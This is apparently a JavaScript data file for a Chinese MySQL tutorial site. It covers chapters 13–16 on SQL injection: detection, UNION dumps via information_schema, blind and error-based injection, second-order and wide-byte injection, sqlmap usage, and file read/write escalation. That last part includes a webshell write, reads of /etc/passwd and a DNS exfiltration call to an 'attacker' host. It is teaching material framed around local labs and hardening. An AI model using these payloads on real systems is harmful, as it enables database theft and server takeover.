// MySQL 学习站 v2 · 第 13-16 章：注入攻防
var CHAPTERS_D = [
{
id:13, title:"SQL 注入原理与判定", stage:"攻防与加固",
intro:"这是全课程的核心章节。注入能成立只有一个原因：<b>用户提供的「值」，被当成了 SQL 的「结构」</b>。这一章把原理、类型判定和手工测试流程讲透——全程只在你自己的本地靶场练习。",
sections:[
{h:"13.1 根因：结构和数据没有分离", p:["开发者想查一个用户，写的是：`SELECT * FROM user WHERE username = '$name'`。这里的 `'$name'` 是<b>把变量直接拼进语句</b>——于是用户输入的内容，就成了 SQL 语法的一部分。"]},
{code:[
"-- 开发者原意：查 username 等于用户输入的那一行\nSELECT * FROM user WHERE username = 'admin';\n\n-- 用户输入改成：admin' -- \n-- 拼出来的语句变成：\nSELECT * FROM user WHERE username = 'admin' -- ';\n--                                  ↑ 后半段被注释掉了\n-- 结果：只用用户名就通过了校验，密码条件被整段注释掉 → 绕过登录\n\n-- 用户输入改成：x' OR '1'='1\n-- 拼出来：\nSELECT * FROM user WHERE username = 'x' OR '1'='1';\n-- 条件恒真 → 返回表里所有用户"]},
{warn:"请注意上面两条 payload 的<b>目的不同</b>：`admin' -- ` 是把后面的条件注释掉（绕过密码校验），`OR '1'='1` 是让条件恒真（返回全部数据）。前者针对「只查一行」的逻辑，后者针对「返回结果集」的逻辑。分不清这两种目的，测试时就会乱试。"},
{h:"13.2 字符型 vs 数字型：先判断类型", tbl:[
["类型","代码形态","构造 payload 时要注意"],
["数字型","`WHERE id = $id`（无引号包裹）","不需要闭合引号，直接 `1 OR 1=1`"],
["字符型","`WHERE name = '$name'`（单引号包裹）","必须先用 `'` 闭合，再注释掉多余部分"],
["双引号型","`WHERE name = \\\"$name\\\"`","用 `\\\"` 闭合（较少见）"],
["LIKE 型","`WHERE name LIKE '%$kw%'`","要先闭合 `%'`，再注释"]]},
{code:[
"-- 判断方法一：加引号看是否报错\n--   传入 1      → 正常\n--   传入 1'     → 报语法错误  ⇒ 字符型（引号参与了语法）\n--   传入 1' --  → 恢复正常    ⇒ 确认可以闭合\n\n-- 判断方法二：数学运算（数字型才成立）\n--   传入 2-1 → 如果返回的是 id=1 的数据，说明 2-1 被当成表达式计算 ⇒ 数字型\n--   传入 1  → 如果返回 id=1 的数据，说明直接拼进语句 ⇒ 数字型"]},
{h:"13.3 闭合与注释：MySQL 的三种注释", tbl:[
["写法","说明","注意"],
["`-- `（两个短横加空格）","标准 SQL 注释","<b>后面的空格必须有</b>，`--x` 不算注释"],
["`#`","MySQL 特有注释","在 URL 里要编码成 `%23`"],
["`/**/`","块注释，可嵌在语句中间","常用在需要隔断关键字的地方"]]},
{code:[
"-- 三种注释在注入里的用法（本地靶场理解用）\nSELECT * FROM user WHERE username = 'admin' -- 后面的都被忽略\nSELECT * FROM user WHERE username = 'admin' # 后面的都被忽略\nSELECT * FROM user WHERE username = 'admin' /* 后面的都被忽略 */\n\n-- 为什么要注释：原始语句后面还有内容，比如 \"' AND password = '$p'\"\n-- 不注释掉就会语法错误，闭合了也得把尾巴去掉"]},
{h:"13.4 三种判定方法：怎么知道「打进去了」", tbl:[
["方法","怎么做","看到什么算成功"],
["报错判定","输入单引号等制造语法错误","页面报 SQL 语法错误、返回 500"],
["布尔判定","构造真/假两个条件对比","两次返回的行数/内容不同"],
["时间判定","让条件成立时执行延时函数","响应明显变慢（例如多 3 秒）"]]},
{code:[
"-- 布尔判定：真条件 vs 假条件（本地靶场）\nSELECT * FROM user WHERE id = 1 AND 1=1;   -- 真：正常返回 1 行\nSELECT * FROM user WHERE id = 1 AND 1=2;   -- 假：返回 0 行\n-- 两句话返回结果不同 ⇒ 这个位置可以被注入\n\n-- 时间判定：让数据库睡一会儿\nSELECT * FROM user WHERE id = 1 AND SLEEP(3);\n-- 如果整条查询从瞬时变成 3 秒，说明条件被执行了"]},
{h:"13.5 手工测试的完整流程（只在你自己的靶场跑）", ol:["<b>找入口</b>：所有会进数据库的参数——URL 参数、表单字段、Cookie、HTTP 头（UA、Referer 有时也会入库）。",
"<b>探类型</b>：按 13.2 的方法判断字符型还是数字型。",
"<b>试闭合</b>：单引号、双引号、括号，看能否让它报错又能恢复正常。",
"<b>验真假</b>：用 `AND 1=1` / `AND 1=2` 对比返回差异，确认条件确实被带进语句。",
"<b>定目标</b>：有回显走 UNION（第 14 章），没回显走盲注（第 15 章）。",
"<b>收尾记录</b>：把可控参数、注入类型、验证方式写进报告——修复时要拿它复测。"]},
{h:"13.6 为什么「过滤单引号」不够", ul:["<b>数字型注入根本不用引号</b>：`id=1 OR 1=1` 里没有单引号，过滤单引号完全无效。",
"<b>编码可以绕过黑名单</b>：URL 编码、大小写、注释分隔、双重编码都能变形。",
"<b>宽字节可以吃掉转义符</b>：GBK 环境下 `%df%27` 能把反斜杠吃掉（第 15 章）。",
"<b>拼接点不一定长得像拼接</b>：表名、列名、ORDER BY 字段、LIMIT 数值都可能是拼接点。"]},
{tip:"一句话结论：<b>黑名单是缓解，不是防御</b>。真正的修复只有两条——能用参数就用参数（预处理），不能参数化的地方（表名/列名/排序字段）用白名单。第 17 章会把这两条写清楚。"},
{h:"13.7 网安视角：一个注入点的价值取决于三件事", tbl:[
["决定因素","影响"],
["返回是否可见","有回显 → UNION 直接拖库；无回显 → 盲注慢慢磨"],
["数据库账号权限","只读账号 → 只能拖库；有 FILE → 可读文件、可写文件；有 DROP → 可删库"],
["能触发的语句类型","能否堆叠多语句、能否写文件，取决于接口和权限"]]},
{p:["这三条正好对应后面的章节：第 14 章讲有回显怎么打，第 15 章讲没回显怎么打，第 16 章讲权限大能打到什么程度，第 17-19 章讲怎么把这三条路全堵上。"]}
],
secview:"注入的根因只有一句：用户输入被当成了 SQL 结构。判定路径是「探类型 → 试闭合 → 验真假 → 定目标」。而修复只有两条：能参数化的用参数，不能参数化的用白名单——过滤关键字永远只是缓解。"
},
{
id:14, title:"UNION 注入与 information_schema 拖库", stage:"攻防与加固",
intro:"有回显的注入里，UNION 是最高效的手法：把攻击者自己的查询结果，并到原查询的结果集里显示出来。这一章走完「探列数 → 找回显位 → 查库名 → 查表名 → 查列名 → 拖数据」这整条链条。",
sections:[
{h:"14.1 UNION 的两个前提", ol:["<b>列数必须一致</b>：原查询返回几列，UNION 后面就必须是几列，否则报错（`The used SELECT statements have a different number of columns`）。",
"<b>页面必须回显</b>：查询结果要真的显示在页面上，否则并进去也看不到。"]},
{p:["所以第一步永远是<b>探列数</b>——这也是为什么第 6 章反复强调 `ORDER BY n` 的用法。"]},
{h:"14.2 探列数：ORDER BY 递增法", code:[
"-- 练习库的 demo2 表只有 2 列，用它演示最清楚\nSELECT * FROM demo2 ORDER BY 1;   -- 正常\nSELECT * FROM demo2 ORDER BY 2;   -- 正常\nSELECT * FROM demo2 ORDER BY 3;   -- ❌ 报错：Unknown column '3' in 'order clause'\n-- 结论：demo2 表有 2 列\n\n-- user 表有 6 列（id/username/password/email/role/created_at）\n-- 所以 ORDER BY 6 正常、ORDER BY 7 报错\n\n-- 另一种探法：直接用 UNION SELECT 逐步加数字\n-- 1,2 正常、1,2,3 报错 → 说明是 2 列"]},
{h:"14.3 information_schema：数据库自己的「说明书」", p:["`information_schema` 是 MySQL 自带的系统库，记录了所有库、表、列的结构信息。它原本是给 DBA 用的，但对注入来说，它就是一张<b>完整的藏宝图</b>。"]},
{tbl:[
["表","关键列","能查出什么"],
["SCHEMATA","schema_name","有哪些库"],
["TABLES","table_schema, table_name, table_rows","每个库里有哪些表、大概多少行"],
["COLUMNS","table_schema, table_name, column_name, data_type","每张表有哪些列、什么类型"],
["STATISTICS","index_name, column_name","有哪些索引（辅助判断是否适合注入）"],
["USER_PRIVILEGES","grantee, privilege_type","当前账号有哪些权限"]]},
{code:[
"-- 先看当前库（大多数注入点只能看到的那个库）\nSELECT DATABASE();\n\n-- 看当前库有哪些表\nSELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();\n\n-- 看整台服务器有哪些库（需要足够权限）\nSELECT schema_name FROM information_schema.schemata;\n\n-- 看某个库某张表有哪些列\nSELECT column_name, data_type FROM information_schema.columns\nWHERE table_schema = 'shop' AND table_name = 'user';"]},
{note:"为什么 `information_schema` 这么关键？因为在经典注入链里，攻击者<b>不知道你的表名和列名</b>。没有它，只能靠猜（user、admin、users、member……）；有了它，结构和盘托出。所以第 19 章加固时会提一个选项：<b>限制业务账号对 information_schema 的访问</b>（部分环境可通过权限收窄实现）。"},
{h:"14.4 完整拖库链条（本地靶场走一遍）", code:[
"-- 前提：已确认某参数是字符型注入，且页面有回显，原查询是 2 列\n\n-- ① 探列数（假设结论是 2 列）\n--   传入: 1' ORDER BY 2 -- \n\n-- ② 找回显位：看 1、2 分别显示在页面哪个位置\n--   传入: 1' UNION SELECT 1,2 -- \n\n-- ③ 拿库名和版本（把结果放在第 2 个回显位）\n--   传入: 1' UNION SELECT 1,CONCAT(DATABASE(),' | ',VERSION()) -- \n\n-- ④ 列出 shop 库的所有表\n--   传入: 1' UNION SELECT 1,GROUP_CONCAT(table_name)\n--         FROM information_schema.tables WHERE table_schema=DATABASE() -- \n\n-- ⑤ 列出 user 表的所有列\n--   传入: 1' UNION SELECT 1,GROUP_CONCAT(column_name)\n--         FROM information_schema.columns\n--         WHERE table_schema=DATABASE() AND table_name='user' -- \n\n-- ⑥ 一次性把用户名和密码哈希都取出来\n--   传入: 1' UNION SELECT 1,GROUP_CONCAT(CONCAT(username,':',password))\n--         FROM user -- "]},
{warn:"⑤⑥ 两步就是「拖库」的实质。这里必须说清楚：<b>以上全部内容只能在你自己的本地靶场（XAMPP + shop 库）里跑</b>。对任何真实网站执行同样的操作，都属于非法侵入计算机信息系统，无论是否造成损失。学它的唯一目的是——让你在审计代码时，一眼就能认出「这里能被拖库」，并把它修掉。"},
{h:"14.5 一次拿不全怎么办：GROUP_CONCAT 的截断", code:[
"-- 默认上限 1024 字节，超了会被静默截断\nSHOW VARIABLES LIKE 'group_concat_max_len';\n\n-- 在会话里临时调大（注入里常见的一步）\nSET SESSION group_concat_max_len = 1000000;\n\n-- 如果权限不够改不了上限，就用 LIMIT 一行一行取\nSELECT username, password FROM user LIMIT 0,1;\nSELECT username, password FROM user LIMIT 1,1;\nSELECT username, password FROM user LIMIT 2,1;\n-- 每改一次偏移量取一行，就是「逐行拖库」"]},
{tip:"审计日志里如果出现 `SET SESSION group_concat_max_len` 或大量形如 `LIMIT 0,1` `LIMIT 1,1` 的连续请求，都是<b>很明确的注入痕迹</b>——正常业务几乎不会这么写。第 19 章会讲怎么靠日志发现这些。"},
{h:"14.6 版本差异：8.0 的 information_schema 有什么不同", tbl:[
["项目","MySQL 5.7","MySQL 8.0"],
["information_schema 实现","基于内存临时表，查询慢","基于数据字典，查询快得多"],
["权限要求","默认所有账号可查结构","默认同样可查，可通过权限收窄"],
["表结构","相对稳定","新增 data_type 等字段，信息更全"],
["对注入的影响","查表名可能较慢","结构查询更快，拖库更流畅"]]},
{p:["所以加固时不能只靠「8.0 更安全」这种印象——<b>结构可查这件事在 8.0 里依然成立</b>，真正的解法是收窄账号权限、修复注入点本身。"]}
],
secview:"UNION 注入的完整链条是：探列数 → 找回显位 → 查库名 → 查表名 → 查列名 → 拖数据。其中 information_schema 是关键——它把「猜表名」变成了「查说明书」。防御侧对应的动作是：修掉注入点 + 收窄账号权限 + 日志里盯住这类特征查询。"
},
{
id:15, title:"盲注、报错注入与其他类型", stage:"攻防与加固",
intro:"不是所有注入都能看到回显。没有回显时，攻击者靠「问是/否」把数据一位一位磨出来——这就是盲注。这一章还覆盖报错注入、二次注入、堆叠注入和宽字节注入这几种容易被忽视的类型。",
sections:[
{h:"15.1 布尔盲注：用真假回答把数据问出来", p:["页面不显示数据，但显示结果不同（比如「登录成功/失败」「存在/不存在」）。于是攻击者把问题设计成「是/否」，一位一位地猜。"]},
{code:[
"-- 先确认是布尔盲注（真假条件产生不同页面）\nSELECT * FROM user WHERE id=1 AND 1=1;   -- 页面 A\nSELECT * FROM user WHERE id=1 AND 1=2;   -- 页面 B（不同！）⇒ 可用\n\n-- 猜数据库名第一个字符的 ASCII 码是否大于 100\nSELECT * FROM user WHERE id=1\n  AND ASCII(SUBSTRING((SELECT DATABASE()),1,1)) > 100;\n\n-- 二分法逐位收敛：>100 真 → >115 假 → …… 8 次以内定位一个字符\n-- 然后 SUBSTRING(...,2,1) 取第二位，继续\n\n-- 猜表名里有没有 user\nSELECT * FROM user WHERE id=1\n  AND (SELECT COUNT(*) FROM information_schema.tables\n       WHERE table_schema=DATABASE() AND table_name='user') > 0;"]},
{note:"布尔盲注的原理不复杂，难在<b>手工做效率极低</b>——一个库名就要上百次请求。所以实战里这种活是脚本干的（见 15.7 的 sqlmap）。你只要理解「它靠真假差异传递信息」就够了。"},
{h:"15.2 时间盲注：连真假都看不出来时", p:["如果页面在任何情况下都长一样，那就只剩一种可观测信号：<b>响应时间</b>。"]},
{code:[
"-- 条件成立时睡 3 秒，不成立立刻返回\nSELECT * FROM user WHERE id=1 AND IF(1=1, SLEEP(3), 0);   -- 慢\nSELECT * FROM user WHERE id=1 AND IF(1=2, SLEEP(3), 0);   -- 快\n\n-- 把判断条件换成取数据的表达式\nSELECT * FROM user WHERE id=1\n  AND IF(ASCII(SUBSTRING((SELECT password FROM user LIMIT 1),1,1))>100, SLEEP(3), 0);\n\n-- 另一种延时函数（不依赖 SLEEP）\n-- BENCHMARK(5000000, MD5('x'))   让 CPU 忙一会儿"]},
{warn:"时间盲注对服务器负担很重：<b>每个字符都要发起多次请求、每次拖几秒</b>。所以它在日志里非常显眼——同一个接口被高频请求、每次响应时间都在几秒、参数里全是 `SLEEP` / `IF` / `BENCHMARK`。这是最好检测的一类注入，第 19 章会把它列进审计规则。"},
{h:"15.3 报错注入：让数据库把答案写在错误信息里", p:["有些页面虽然不显示数据，但会把数据库的报错信息直接打印出来。这条路径下，攻击者可以用「故意制造类型错误」的函数，把要查的数据拼进错误消息。"]},
{code:[
"-- 思路：把要查的数据拼进一个非法参数，让函数报错并回显出来\n-- XPath 类的两个经典函数（1,2 是任意占位参数）\nSELECT UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE())), 1);\nSELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM user LIMIT 1)));\n\n-- 0x7e 是 ~ 的十六进制，用来当分隔标记，方便在报错里定位结果\n\n-- 另一路：利用 GROUP BY 的重复键冲突报错\nSELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND(0)*2))\nFROM information_schema.tables GROUP BY 2;"]},
{note:"报错注入<b>高度依赖版本和函数可用性</b>：XPath 类函数在较新的 MySQL 8.0 中已被标记弃用，某些加固环境也会屏蔽报错回显。所以实战里要先探测「哪个函数可用」，不行就退回盲注。<b>你学它的意义在于防御——只要应用不把数据库报错抛给用户，这条路径就直接断掉</b>（所以第 17 章把「关闭调试输出」列为一条防御措施）。"},
{h:"15.4 二次注入：最容易被漏掉的类型", p:["数据在<b>写入</b>时被正确转义了，但在后续<b>取出使用</b>时又被拼进 SQL——这就是二次注入。因为它跨越了「写」和「读」两个环节，很多安全性检查只看单次请求，根本发现不了。"]},
{code:[
"-- 场景：用户注册时，用户名会被转义后安全存入数据库\n--   输入:  admin'#\n--   写入:  INSERT INTO user (username) VALUES ('admin\\'#')   -- 转义，安全\n--   库里存的是原样字符串:  admin'#\n\n-- 之后「修改密码」功能这样做：\n--   UPDATE user SET password='$new' WHERE username='$name'\n--   而 $name 是从数据库里取出来的（没再转义）\n--   拼出来变成：\nUPDATE user SET password='新密码' WHERE username='admin'#';\n-- 于是 admin 的密码被改了 —— 攻击者用自己的账号，改了管理员的密码"]},
{warn:"二次注入是审计时最容易漏的：<b>只看输入过滤是不够的，要追「这个值从库里取出来之后，又被拼到了哪里」</b>。防御办法和普通注入一样：不管数据从哪来，进 SQL 时都必须参数化——<b>数据库里的数据同样不可信</b>。"},
{h:"15.5 堆叠注入：一次提交多条语句", code:[
"-- 如果接口支持一次执行多条语句，就能这样干\nSELECT * FROM user WHERE id=1; DROP TABLE user; --\n\n-- 能不能成功，取决于「客户端 API 是否允许多语句」：\n--   PHP 的 mysqli_query()        默认不支持（一次一条）\n--   PHP 的 mysqli_multi_query()  支持（危险）\n--   PHP 的 PDO（默认配置）        不支持\n--   sqlmap 里对应 --technique=S"]},
{p:["所以「能不能堆叠」不是数据库决定的，而是<b>应用程序怎么调用数据库</b>决定的。审计代码时看到 `mysqli_multi_query`，就值得重点看它的参数来源。"]},
{h:"15.6 宽字节注入：让转义符被「吃掉」", p:["当数据库和连接字符集是 GBK 这类多字节编码时，一个输入字节可能和后面的反斜杠拼成一个合法汉字，从而<b>把转义用的反斜杠吃掉</b>，让后面的单引号逃逸出来。"]},
{code:[
"-- 前提（三个条件同时满足才会出现）\n--   1) 数据库/连接字符集是 GBK、GB2312 等双字节编码\n--   2) 应用用 addslashes / mysql_real_escape_string 做转义（在字符集设置之前调用）\n--   3) 没有使用预处理\n\n-- 原理：\n--   输入 %df%27\n--   转义后变成 %df%5c%27    （%5c 就是反斜杠）\n--   GBK 把 %df%5c 解析成一个汉字，于是 %27（单引号）逃逸出来 → 注入成立\n\n-- 对应的防御：\n--   1) 统一使用 utf8mb4（不要用 GBK）\n--   2) 用预处理代替转义函数\n--   3) 设置字符集要在转义之前"]},
{note:"宽字节注入是一个很好的例子，说明<b>「字符集」这种看起来与安全无关的配置，也能变成漏洞的一部分</b>。这也是为什么第 2 章要专门强调建库时选 utf8mb4。"},
{h:"15.7 sqlmap：把手工过程自动化（仅限授权靶场）", code:[
"# 仅在你自己的本地靶场或明确授权的测试环境中使用\n\n# 基本探测：判断是否存在注入、是什么类型\nsqlmap -u \"http://localhost/shop/news.php?id=1\" --batch\n\n# 列出所有数据库\nsqlmap -u \"http://localhost/shop/news.php?id=1\" --dbs\n\n# 列出指定库的表 / 指定表的列\nsqlmap -u \"...\" -D shop --tables\nsqlmap -u \"...\" -D shop -T user --columns\n\n# 拖出数据\nsqlmap -u \"...\" -D shop -T user -C username,password --dump\n\n# 想指定技术类型（B布尔 E报错 U联合 S堆叠 T时间）\nsqlmap -u \"...\" --technique=U --batch\n\n# 有请求包时可以直接带 Cookie / POST 数据\nsqlmap -u \"http://localhost/shop/login.php\" --data=\"user=1&pass=1\" --batch"]},
{warn:"<b>使用 sqlmap 的红线</b>：只对它探测范围内的、你自己拥有或明确书面授权的目标使用。对真实网站的未授权测试属于违法行为。桌面上的靶场（DVWA、自己搭的站）是合适的练习对象。另外：<b>sqlmap 的请求日志本身就是很明显的攻击特征</b>，这也是为什么防守方要看日志、上 WAF。"}
],
secview:"没有回显时，攻击者用三种方式传递信息：真假差异（布尔盲注）、响应时间（时间盲注）、错误信息（报错注入）。另外三种容易漏的类型是二次注入、堆叠注入、宽字节注入。防御的通用结论只有一条：所有进 SQL 的路径都要参数化，包括来自数据库自身的数据。"
},
{
id:16, title:"文件读写与提权链", stage:"攻防与加固",
intro:"前面几章讲的是「把数据拿走」。这一章讲更严重的一步：<b>当数据库账号握着 FILE 权限时，攻击者能从「拖库」升级到「控制服务器」</b>。理解这条链，才能真正理解为什么加固清单里 FILE 权限必须收回。",
sections:[
{h:"16.1 前提：三把钥匙缺一不可", ol:["<b>FILE 权限</b>：账号必须被授予 `FILE`，否则读写函数直接失败。",
"<b>secure_file_priv</b>：MySQL 的目录限制开关，决定允许读写哪个目录。",
"<b>操作系统层面的可读写</b>：mysqld 进程对目标文件/目录得有相应权限（这是 OS 的事，不是 MySQL 的事）。"]},
{code:[
"-- 先看当前账号有什么权限（能不能走这条路，这一条就够了）\nSHOW GRANTS FOR CURRENT_USER();\n\n-- 看目录限制\nSHOW VARIABLES LIKE 'secure_file_priv';\n--   返回具体路径 → 只能读写该目录下（推荐配置）\n--   返回空字符串 → 不限制（危险）\n--   返回 NULL     → 完全禁止（最安全）\n\n-- 看数据目录和插件目录（攻击者关心路径，你关心它们是否可写）\nSELECT @@datadir, @@plugin_dir;"]},
{h:"16.2 LOAD_FILE：读服务器的文件", code:[
"-- 读文本文件（失败返回 NULL，不报错，所以探测时要判断返回值）\nSELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('C:\\\\\\\\Windows\\\\\\\\win.ini');\n\n-- 攻击者最想读的几类文件：\n--   数据库自己的配置文件（my.cnf / my.ini）→ 里面有 root 口令、数据目录\n--   Web 应用的配置文件（config.php）→ 数据库账号密码、密钥\n--   系统文件（/etc/passwd、SSH 私钥）→ 后续横向移动\n\n-- 防御视角：为什么配置文件要收紧权限\n--   my.cnf / my.ini 只允许服务账号读\n--   Web 配置里的数据库口令用最小权限账号（就算被读到，也只能干很少的事）"]},
{h:"16.3 INTO OUTFILE：往服务器写文件", code:[
"-- 把查询结果写成一个文件（目标文件必须不存在，否则报错）\nSELECT 'hello' INTO OUTFILE '/tmp/test.txt';\n\n-- 写一个 webshell（本地靶场演示原理用）\n-- 前提：知道 Web 根目录、该目录可写、且能被解析执行\nSELECT '<?php echo 1; ?>' INTO OUTFILE '/var/www/html/test.php';\n\n-- 相关限制要知道：\n--   文件不能已存在（不能用它覆盖）\n--   secure_file_priv 必须放行目标目录\n--   必须知道绝对路径"]},
{warn:"这一段是「拖库」到「getshell」的分界点。必须强调：<b>这里的内容只用于理解攻击链，让你知道为什么 FILE 权限必须收回</b>。对任何非自己所有的服务器写文件都是严重违法行为。防御侧的动作很明确：<b>业务账号绝不授予 FILE、secure_file_priv 设为 NULL 或限定目录、Web 目录对数据库进程不可写、Web 服务以低权限运行</b>。"},
{h:"16.4 UDF 提权：从 SQL 到系统命令", p:["如果账号不仅有 FILE，还有创建函数的权限，攻击者可以往 MySQL 的插件目录写一个共享库，再注册成函数，从而<b>在数据库服务器上执行系统命令</b>。"]},
{code:[
"-- 原理链条（理解用，不需要背命令）：\n--   ① 查插件目录：SELECT @@plugin_dir;\n--   ② 把共享库文件（.so / .dll）写进插件目录\n--   ③ 注册成自定义函数：CREATE FUNCTION ... SONAME 'xx.so'\n--   ④ 调用它执行系统命令\n\n-- 这一路需要同时满足：\n--   FILE 权限（写文件）\n--   CREATE FUNCTION / INSERT 到系统表的权限（注册函数）\n--   插件目录可写\n--   数据库进程的运行身份权限不小\n\n-- 因此防御要点是层层设限，任何一层断掉这条路就断了：\n--   业务账号无 FILE、无 CREATE ROUTINE、无 SUPER\n--   plugin_dir 严格权限（只有 mysql 服务自己能写）\n--   数据库进程用专用低权限账号运行（不要用 root 跑 mysqld）"]},
{h:"16.5 其他常见利用方向（了解即可）", tbl:[
["方向","依赖条件","防御对应"],
["读配置文件拿更高权限口令","FILE 权限 + 文件可读","配置文件权限收紧 + 最小权限账号"],
["写 WebShell","FILE 权限 + Web 目录可写 + 可解析","Web 目录对 DB 进程不可写 + 禁用危险函数"],
["写计划任务/启动项提权","FILE 权限 + 系统目录可写 + 高权限运行","mysqld 低权限运行"],
["DNS 外带数据（OOB）","能发起 DNS 查询（如 `LOAD_FILE('\\\\\\\\attacker\\\\x')`）","限制数据库出网、监控异常 DNS"],
["利用 MySQL 客户端特性读文件","客户端本地数据加载（`local_infile`）","服务端 `local_infile=OFF`"]]},
{h:"16.6 加固清单：把这条链每一环都掐断", tbl:[
["环节","加固动作","配置/命令示例"],
["权限","业务账号收回 FILE、SUPER、CREATE ROUTINE、PROCESS","`REVOKE FILE ON *.* FROM 'app'@'localhost';`"],
["目录限制","`secure_file_priv` 设为 NULL 或限定专用目录","my.cnf: `secure_file_priv = NULL`"],
["进程身份","mysqld 用专用低权限账号运行，不用 root","Windows 服务账号 / Linux `user=` 配置"],
["Web 目录","数据库进程对 Web 目录无写权限","文件系统权限分离"],
["本地加载","关闭 `local_infile`","`SET GLOBAL local_infile = OFF;`"],
["网络","数据库不出网，只允许应用服务器访问 3306","云安全组 + 主机防火墙"],
["监控","监测 `LOAD_FILE` / `INTO OUTFILE` 的异常调用","审计日志规则"]]},
{code:[
"-- 逐条验证加固是否生效（在你自己的库上执行）\nSHOW VARIABLES LIKE 'secure_file_priv';\nSHOW VARIABLES LIKE 'local_infile';\nSHOW GRANTS FOR 'app'@'localhost';\nSELECT @@plugin_dir;\n\n-- 用业务账号试着读文件，应该失败或返回 NULL\n-- SELECT LOAD_FILE('/etc/passwd');   -- 期望：NULL 或权限错误"]}
],
secview:"文件读写是「拖库 → getshell」的那一跳，前提是三把钥匙：FILE 权限、secure_file_priv 放行、OS 层可读写。加固的核心思路是<b>让这三把钥匙永远凑不齐</b>：业务账号无 FILE、secure_file_priv 设 NULL、mysqld 低权限运行、Web 目录不可写、数据库不出网。"
}
];
